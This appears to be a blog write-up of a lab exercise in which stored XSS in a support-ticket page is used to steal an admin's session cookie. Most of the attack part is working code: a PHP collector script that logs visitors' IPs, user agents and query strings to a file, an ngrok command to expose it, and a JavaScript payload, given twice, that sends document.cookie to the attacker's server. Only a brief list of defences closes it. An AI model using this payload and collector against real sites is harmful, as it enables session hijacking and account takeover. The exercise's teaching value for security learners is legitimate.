# Uncovering Critical Vulnerabilities: Exfiltrating Admin Cookies Through Stored XSS 

***
![](https://media.giphy.com/media/i3ikTK3ZwBy4uUH1Ot/giphy.gif)

***

## Overview

We are giving a website with 2 users

**_A normal user page :_**


![](https://i.imgur.com/SeBIL1f.png)



**_An admin page_**



![](https://i.imgur.com/xcjIfUR.png)


**The task here is to steal the Admin cookie via stored xss, so we can automatically be logged in as admin**

## **Understanding the flow**


- Starting with a basic XSS payload i wanted to understand the flow of this application, so i sent our payload to the **Admin** via the support ticket page of the normal user

![](https://i.imgur.com/THMNNRs.png)

- Navigating to the admin page and refreshing it, we truly have stored XSS

![](https://i.imgur.com/0mXRLZ1.png)



## **Preparing our Exploit**


- First of all since we will be using **Ngrok** as our server, we need to create a Script that will take the logs of our admin and save it to a `.txt` file every time he tries to login or refresh his browser made by [@Ravid11345277](https://twitter.com/Ravid11345277). As seen below we can save this PHP code in our file system with the extension `.php`

```PHP
<?php

$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
$ua=$_SERVER['HTTP_USER_AGENT'];


$fp=fopen('cookies.txt' , 'a+');

fwrite($fp, $ip.' '.$ua."\n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);

?>
```



- Now start up your **Ngrok** server with the following command, where the `PHP` file was saved

```bash
$ ngrok http 80
```



![](https://i.imgur.com/PNGlTEU.png)


- Navigating to the normal user page we can craft the XSS payload that will steal the **Admin** user cookies by sending them to a remote server, which in this case is the `xss.php` file we created :

```js
<script> var i=new Image(); i.src="<NGROK-LINK-GOES-HERE>/xss.php?cookie="+document.cookie;</script>
```

- But just before we do anything let confirm if our **Ngrok** server is working by copying the forwarding link and calling the `PHP` file we created then, so your link should look like this

```
https://52c8-102-89-32-48.ngrok-free.app/{filename}.php
```

![](https://i.imgur.com/klOJ6Lz.png)


> **Note :** I added the `?test` parameter so i will see if it works when i navigate to `cookies.txt`

- Booyah, Navigating to `/cookies.txt` we can see our server is up and running, **P.N :** I blocked my public IP, you should know why 😆 

![](https://i.imgur.com/snNWgvj.png)



## **Launching Our Exploit**

Since we know things are good to go, we can take our malicious XSS payload and attempt to get the **admin** cookie in `/cookies.txt`

- Copy your malicious XSS payload and make sure to replace the `NGROK-LINK-GOES-HERE` with the right **Ngrok** server link, then we can **Submit** it to the **Admin**

```js
<script> var i=new Image(); i.src="<NGROK-LINK-GOES-HERE>/xss.php?admin_cookie="+document.cookie;</script>
```

![](https://i.imgur.com/BFAUqoa.png)


- Navigating to the **Admin** page, we can refresh the page and we have `test 2` created already

![](https://i.imgur.com/YrVmwf6.png)


- Referring back to `/cookies.txt` we have our admin cookie dumped

![](https://i.imgur.com/MbMCQdE.png)


Note that this doesn't only affect the admin user, every user cookie will automatically be dumped once there is a page refresh and we have an account takeover right there, there are various ways to prevent this kind of attacks, here are few


- **Input Validation and Sanitization**
- **Content Security Policy (CSP)**
- **Use Security Headers**
- **Web Application Firewall (WAF)**
- **Security Testing**


**Stay Safe**


![](https://media3.giphy.com/media/ZEILv6a8KBDFq4KhbB/200.webp?cid=ecf05e47uctzn77s5wozeru7eu1c300knw0k72odf3eeenn8&ep=v1_gifs_search&rid=200.webp&ct=g)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
